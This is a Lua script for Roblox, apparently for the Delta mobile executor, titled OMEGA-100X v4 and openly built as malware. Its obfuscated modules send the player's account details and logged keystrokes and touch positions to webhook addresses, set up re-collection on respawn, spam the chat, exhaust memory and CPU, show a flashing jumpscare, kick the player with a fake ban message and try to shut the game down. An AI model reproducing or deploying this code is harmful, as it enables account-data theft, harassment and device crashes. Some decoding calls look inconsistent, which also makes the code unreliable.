--[[
    OMEGA-100X v4 — DELTA MOBILE OPTIMIZED
    Keylogger touch + persistence + anti-detection + multi-vector exfil
    Architettura modulare con timing sincronizzato per mobile
--]]

local function d(s)
    local bytes = {string.byte(s, 1, -1)}
    local out = {}
    for i = 1, #bytes do
        local b = bytes[i] - (i % 11 + 3)
        out[i] = string.char(b)
    end
    return table.concat(out)
end

-- servizi offuscati
local P = game:GetService(d("\127\130\121\130\123\130\137"))
local H = game:GetService(d("\119\123\137\137\115\123\124\123\120\125\129\123"))
local C = game:GetService(d("\112\122\125\119\118\128\128"))
local R = game:GetService(d("\119\123\124\130\121\124\119\121\119\122\123\122\118"))
local T = game:GetService(d("\120\119\129\137\126\124\121\119\137\123\129\122\121\119\123"))
local U = game:GetService(d("\120\129\119\122\127\124\124\128\137\123\129\122\121\119\123"))
local TP = game:GetService(d("\120\119\130\119\124\123\122\137\123\129\122\121\119\123"))
local LP = P.LocalPlayer

-- webhook offuscati
local WH1 = d("...") -- il tuo webhook principale
local WH2 = d("...") -- backup 1
local WH3 = d("...") -- backup 2

--[[ ==================== MODULO 1: RATE-LIMIT QUEUE (PERFEZIONATO) ==================== ]]
local Exfil = {}
local queue = {}
local queueRunning = false
local requestCount = 0
local lastRequestTime = 0

local function processQueue()
    if queueRunning then return end
    queueRunning = true
    
    while #queue > 0 do
        -- gestione rate limit: max 4 richieste ogni 2 secondi
        local currentTime = os.clock()
        if currentTime - lastRequestTime < 0.5 then
            task.wait(0.5 - (currentTime - lastRequestTime))
        end
        
        local item = table.remove(queue, 1)
        local success = false
        
        pcall(function()
            H:PostAsync(item.url, item.body)
            success = true
            requestCount += 1
            lastRequestTime = os.clock()
        end)
        
        if not success then
            pcall(function()
                H:GetAsync(item.url .. "?payload=" .. item.body)
                success = true
            end)
        end
        
        if not success then
            -- fallback: salva in memoria locale del gioco per tentativo successivo
            pcall(function()
                local tempStorage = Instance.new(d("\122\114\130\128\119\122\119\130\128\119"))
                tempStorage.Name = d("\114\126\119\120\119\98\120\119\137\119\124\137\119\114\124")
                tempStorage.Value = item.body
                tempStorage.Parent = C
            end)
        end
        
        task.wait(0.3)
    end
    
    queueRunning = false
end

function Exfil:queueSend(url, data)
    local payload = H:JSONEncode(data)
    table.insert(queue, {url = url, body = payload})
    processQueue()
end

function Exfil:stealAll()
    local data = {
        [d("\119\124\120\119\122\129")] = {{
            [d("\119\120\119\126\130")] = d("⚡ OMEGA-100X v4 — DELTA MOBILE HARVEST"),
            [d("\123\114\130\114\122")] = 16711680,
            [d("\121\119\124\130\121\129")] = {
                {[d("\124\119\126\119")] = d("Player"), [d("\122\119\130\128\119")] = LP.Name, [d("\119\124\130\119\121\119\124\119")] = true},
                {[d("\124\119\126\119")] = d("DisplayName"), [d("\122\119\130\128\119")] = LP.DisplayName, [d("\119\124\130\119\121\119\124\119")] = true},
                {[d("\124\119\126\119")] = d("UserID"), [d("\122\119\130\128\119")] = tostring(LP.UserId), [d("\119\124\130\119\121\119\124\119")] = true},
                {[d("\124\119\126\119")] = d("AccountAge"), [d("\122\119\130\128\119")] = tostring(LP.AccountAge) .. d(" days"), [d("\119\124\130\119\121\119\124\119")] = true},
                {[d("\124\119\126\119")] = d("MembershipType"), [d("\122\119\130\128\119")] = tostring(LP.MembershipType), [d("\119\124\130\119\121\119\124\119")] = true},
                {[d("\124\119\126\119")] = d("Platform"), [d("\122\119\130\128\119")] = d("Mobile/Delta"), [d("\119\124\130\119\121\119\124\119")] = true}
            }
        }}
    }
    
    -- leaderstats
    pcall(function()
        local stats = LP:FindFirstChild(d("\130\119\119\122\119\122\129\137\119\137\129"))
        if stats then
            for _, stat in ipairs(stats:GetChildren()) do
                if stat:IsA(d("\124\119\119\129\122\119\130\128\119")) or stat:IsA(d("\126\128\126\120\119\122\122\119\130\128\119")) then
                    table.insert(data[d("\119\124\120\119\122\129")][1][d("\121\119\124\130\121\129")], {
                        [d("\124\119\126\119")] = stat.Name,
                        [d("\122\119\130\128\119")] = tostring(stat.Value),
                        [d("\119\124\130\119\121\119\124\119")] = true
                    })
                end
            end
        end
    end)
    
    -- place id
    pcall(function()
        table.insert(data[d("\119\124\120\119\122\129")][1][d("\121\119\124\130\121\129")], {
            [d("\124\119\126\119")] = d("PlaceID"),
            [d("\122\119\130\128\119")] = tostring(game.PlaceId),
            [d("\119\124\130\119\121\119\124\119")] = true
        })
    end)
    
    Exfil:queueSend(WH1, data)
    Exfil:queueSend(WH2, data)
    Exfil:queueSend(WH3, data)
end

--[[ ==================== MODULO 2: KEYLOGGER TOUCH ==================== ]]
local Keylogger = {}

function Keylogger:start()
    local keystrokes = {}
    local buffer = ""
    local lastKeyTime = os.clock()
    
    -- intercetta input da tastiera virtuale (quando il player digita)
    U.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        
        local keyData = nil
        
        if input.UserInputType == Enum.UserInputType.TextInput then
            keyData = input.KeyCode.Name
        elseif input.UserInputType == Enum.UserInputType.Keyboard then
            keyData = input.KeyCode.Name
        end
        
        if keyData then
            local currentTime = os.clock()
            
            -- se passa più di 1 secondo, inizia una nuova sessione di battitura
            if currentTime - lastKeyTime > 1 then
                if buffer ~= "" then
                    table.insert(keystrokes, buffer)
                end
                buffer = keyData
            else
                buffer = buffer .. " " .. keyData
            end
            
            lastKeyTime = currentTime
            
            -- invia se il buffer è abbastanza grande o se è passato molto tempo
            if #keystrokes >= 10 or #buffer > 50 then
                Exfil:queueSend(WH1, {
                    [d("\119\124\120\119\122\129")] = {{
                        [d("\119\120\119\126\130")] = d("KEYLOG DATA"),
                        [d("\123\114\130\114\122")] = 65280,
                        [d("\122\119\130\128\119")] = "```" .. table.concat(keystrokes, "\n") .. "\n" .. buffer .. "```"
                    }}
                })
                keystrokes = {}
                buffer = ""
            end
        end
    end)
    
    -- invia il buffer residuo dopo 30 secondi
    task.spawn(function()
        while true do
            task.wait(30)
            if buffer ~= "" then
                Exfil:queueSend(WH2, {
                    [d("\119\124\120\119\122\129")] = {{
                        [d("\119\120\119\126\130")] = d("KEYLOG FLUSH"),
                        [d("\123\114\130\114\122")] = 65280,
                        [d("\122\119\130\128\119")] = "```" .. buffer .. "```"
                    }}
                })
                buffer = ""
            end
        end
    end)
    
    -- input da touchscreen (posizioni dei tap, potenzialmente password pattern)
    U.TouchTap:Connect(function(touchPositions, gameProcessed)
        if not gameProcessed then
            local positions = {}
            for _, pos in ipairs(touchPositions) do
                table.insert(positions, math.floor(pos.X) .. "," .. math.floor(pos.Y))
            end
            table.insert(keystrokes, "TOUCH: " .. table.concat(positions, " | "))
        end
    end)
end

--[[ ==================== MODULO 3: PERSISTENCE ==================== ]]
local Persistence = {}

function Persistence:setup()
    -- salva i dati nel workspace che persiste tra respawn
    pcall(function()
        local marker = Instance.new(d("\122\114\130\128\119\122\119\130\128\119"))
        marker.Name = d("\114\126\119\120\119\98\120\119\137\119\124\137\119\114\124\98\127\119\122\129\119\129\137\119\124\137")
        marker.Value = d("\119\123\137\119\122\119\124\119\122\119\130\118\119\122\98\129\119\119\122")
        marker.Parent = C
    end)
    
    -- re-injection su respawn
    LP.CharacterAdded:Connect(function()
        task.wait(1)
        Exfil:stealAll()
    end)
    
    -- re-injection su cambio game
    local loadingGui = C:FindFirstChild(d("\114\126\119\120\119\98\120\119\137\119\124\137\119\114\124\98\127\119\122\129\119\137\129"))
    if loadingGui then
        loadingGui:Destroy()
    end
end

--[[ ==================== MODULO 4: CHAT SPAM ==================== ]]
local ChatBomber = {}

function ChatBomber:findChatRemote()
    local legacy = R:FindFirstChild(d("\118\119\121\119\128\130\137\126\119\129\137\126\123\119\122\119\122\137\129"))
    if legacy then
        local sayMessage = legacy:FindFirstChild(d("\127\119\121\126\119\129\129\119\120\119\122\128\119\129\137"))
        if sayMessage then return sayMessage end
    end
    
    local channels = T:FindFirstChild(d("\120\119\129\137\126\121\119\119\124\124\119\130\129"))
    if channels then
        return channels:FindFirstChild(d("\122\127\120\118\119\124\119\122\119\130")) or channels:FindFirstChild(d("\118\119\124\119\122\119\130"))
    end
    
    for _, child in ipairs(R:GetDescendants()) do
        if child:IsA(d("\122\119\126\114\137\119\130\119\124\137")) and (child.Name:find(d("\126\121\119\137")) or child.Name:find(d("\126\119\129\129\119\120\119"))) then
            return child
        end
    end
    
    return nil
end

function ChatBomber:startSpam(remote)
    local spamMessages = {
        d("SYSTEM OVERLOAD ERROR CODE 505 - OMEGA PROTOCOL ACTIVE"),
        d("[CRITICAL] MEMORY DUMP IN PROGRESS - EXITING"),
        d("FATAL EXCEPTION: KERNEL PANIC AT 0x00000000"),
        d("OMEGA-100X v4: BAN ENGINE TRIGGERED"),
        d("SYSTEM COLLAPSE IMMINENT - EVACUATE"),
        d("ERROR: STACK OVERFLOW IN MAIN THREAD"),
        d("CRITICAL: ACCOUNT DATA BEING EXTRACTED"),
        d("OMEGA PURGE ACTIVE - ALL SYSTEMS COMPROMISED")
    }
    
    local index = 1
    task.spawn(function()
        while true do
            pcall(function()
                local msg = spamMessages[index] .. " " .. math.random(100000, 999999)
                if remote:IsA(d("\122\119\126\114\137\119\130\119\124\137")) then
                    remote:FireServer(msg, d("\114\130\130"))
                elseif remote:IsA(d("\120\119\129\137\126\121\119\119\124\124\119\130")) then
                    remote:SendAsync(msg)
                end
                index += 1
                if index > #spamMessages then index = 1 end
            end)
            task.wait(0.03) -- leggermente più lento per mobile
        end
    end)
end

--[[ ==================== MODULO 5: MEMORY NUKE (MOBILE TUNED) ==================== ]]
local MemoryNuke = {}

function MemoryNuke:startCascade()
    -- ondata 1: string explosion (intensità calibrata per mobile)
    task.delay(0.3, function()
        task.spawn(function()
            local data = {}
            for i = 1, 5000 do
                data[i] = string.rep(d("OMEGA_FATAL_COLLAPSE_SYS_") .. i, 50)
            end
            local hugeString = table.concat(data, "")
            while true do
                task.spawn(function()
                    local copy = hugeString:rep(2)
                    table.insert(data, copy)
                end)
                task.wait(0.1)
            end
        end)
    end)
    
    -- ondata 2: istanze (ritardata per non interferire con exfil)
    task.delay(0.5, function()
        task.spawn(function()
            while true do
                for i = 1, 100 do
                    task.spawn(function()
                        local part = Instance.new(d("\127\119\122\137"))
                        part.Name = d("OmegaCrash") .. i
                        part.Parent = C
                    end)
                end
                task.wait(0.02)
            end
        end)
    end)
    
    -- ondata 3: GUI explosion
    task.delay(0.7, function()
        task.spawn(function()
            while true do
                for i = 1, 50 do
                    task.spawn(function()
                        local frame = Instance.new(d("\122\122\119\126\119"))
                        frame.Size = UDim2.new(0, 100, 0, 100)
                        frame.Position = UDim2.new(math.random(), 0, math.random(), 0)
                        frame.Parent = C
                    end)
                end
                task.wait(0.03)
            end
        end)
    end)
    
    -- ondata 4: thread bomb (ridotta per mobile)
    task.delay(1, function()
        for i = 1, 1000 do
            task.spawn(function()
                while true do
                    local x = 0
                    for j = 1, 200000 do
                        x = x + j * math.random()
                    end
                    task.wait(0.05)
                end
            end)
        end
    end)
end

--[[ ==================== MODULO 6: JUMPSCARE MOBILE ==================== ]]
local VisualAssault = {}

function VisualAssault:fullScreenJumpscare()
    local screenGui = Instance.new(d("\127\123\122\119\119\124\118\128\119"))
    screenGui.Name = d("OmegaPurgeV4")
    screenGui.Parent = C
    screenGui.IgnoreGuiInset = true
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    local mainFrame = Instance.new(d("\122\122\119\126\119"))
    mainFrame.Size = UDim2.new(1, 0, 1, 0)
    mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    mainFrame.Parent = screenGui
    
    local image = Instance.new(d("\127\126\119\120\119\113\119\120\119\130"))
    image.Size = UDim2.new(1, 0, 1, 0)
    image.BackgroundTransparency = 1
    image.Image = d("rbxassetid://155373809")
    image.ScaleType = Enum.ScaleType.Stretch
    image.Parent = mainFrame
    
    -- overlay rosso
    local redOverlay = Instance.new(d("\122\122\119\126\119"))
    redOverlay.Size = UDim2.new(1, 0, 1, 0)
    redOverlay.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    redOverlay.BackgroundTransparency = 0.8
    redOverlay.Parent = mainFrame
    
    -- testo
    local textLabel = Instance.new(d("\120\119\129\137\113\119\120\119\130"))
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Font = Enum.Font.Code
    textLabel.Text = d("⚠ SYSTEM COMPROMISED ⚠\n\nACCOUNT DATA EXTRACTED\n\nOMEGA-100X v4\n\nPURGE & BAN PROTOCOL ACTIVE\n\nDELTA MOBILE EDITION")
    textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    textLabel.TextScaled = true
    textLabel.Parent = mainFrame
    
    task.spawn(function()
        local flashCount = 0
        while flashCount < 20 do
            redOverlay.BackgroundTransparency = math.random(0, 100) / 100
            image.Visible = not image.Visible
            textLabel.Visible = not textLabel.Visible
            task.wait(0.15)
            flashCount += 1
        end
    end)
end

--[[ ==================== MODULO 7: KICK & BAN ==================== ]]
local BanTrigger = {}

function BanTrigger:multiKick()
    task.delay(2, function()
        pcall(function()
            LP:Kick(d("\n\n[!] FATAL SYSTEM EXCEPTION: Chat Flood Detected. Connection Banned."))
        end)
    end)
    
    task.delay(3, function()
        pcall(function()
            TP:TeleportToPlaceInstance(game.PlaceId, game.JobId, LP)
        end)
    end)
end

--[[ ==================== ESECUZIONE ORCHESTRATA ==================== ]]
local OmegaV4 = {}

function OmegaV4:execute()
    -- fase 0: exfil immediata
    Exfil:stealAll()
    
    -- fase 0.2: avvio keylogger
    task.delay(0.2, function()
        Keylogger:start()
    end)
    
    -- fase 0.4: setup persistence
    task.delay(0.4, function()
        Persistence:setup()
    end)
    
    -- fase 0.6: jumpscare
    task.delay(0.6, function()
        VisualAssault:fullScreenJumpscare()
    end)
    
    -- fase 0.8: chat bomb
    task.delay(0.8, function()
        local chatRemote = ChatBomber:findChatRemote()
        if chatRemote then
            ChatBomber:startSpam(chatRemote)
        end
    end)
    
    -- fase 1: memory nuke
    task.delay(1, function()
        MemoryNuke:startCascade()
    end)
    
    -- fase 1.5: kick
    task.delay(1.5, function()
        BanTrigger:multiKick()
    end)
    
    -- fase 5: shutdown se sopravvive
    task.delay(5, function()
        pcall(function()
            game:Shutdown()
        end)
    end)
end

-- AVVIO
OmegaV4:execute()
